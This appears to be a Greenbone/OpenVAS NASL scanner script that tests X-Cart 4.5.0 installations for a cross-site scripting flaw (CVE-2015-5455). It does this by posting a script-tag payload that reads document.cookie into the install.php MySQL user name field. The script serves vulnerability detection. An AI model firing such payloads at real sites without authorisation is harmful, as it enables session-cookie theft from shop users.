CPE = "cpe:/a:qualiteam:x-cart";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806059" );
	script_version( "2020-05-08T11:13:33+0000" );
	script_cve_id( "CVE-2015-5455" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 11:13:33 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-10-05 11:33:14 +0530 (Mon, 05 Oct 2015)" );
	script_name( "X_CART Installation Script Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_xcart_detect.sc" );
	script_mandatory_keys( "X_CART/Installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132513" );
	script_tag( name: "summary", value: "This host is installed with XCART
  and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP POST and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "The flaw is due to the install.php script
  does not validate input to the 'MySQL user name' POST parameter before
  returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server." );
	script_tag( name: "affected", value: "XCART versions 4.5.0 and possibly earlier." );
	script_tag( name: "solution", value: "For a workaround, websites running X-Cart
  version 4.5.0 (and possibly below) remove their /install/ directory once it is
  installed." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.x-cart.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/install.php";
sndReq = http_get( item: url, port: port );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
useragent = http_get_user_agent();
if(rcvRes && IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" )){
	host = http_host_name( port: port );
	postData = "params%5Bxcart_http_host%5D=www.esofsolution.com&params%5Bxcart" + "_https_host%5D=www.esofsolution.com&params%5Bxcart_web_dir%5D=%" + "2Fxcart&params%5Bmysqlhost%5D=localhost&params%5Bmysqluser%5D=%22" + "%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&params%5" + "Bmysqlbase%5D=xcart&params%5Bmysqlpass%5D=&params%5Bcompany_email" + "%5D=&params%5Bauth_code%5D=DEMO&params%5Bagree%5D=on&params%5Blng" + "code%5D=US&current=3";
	sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded", "\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", "\\r\\n", postData, "\\r\\n" );
	rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
	if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "alert(document.cookie)" ) && ContainsString( rcvRes, "X-Cart" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

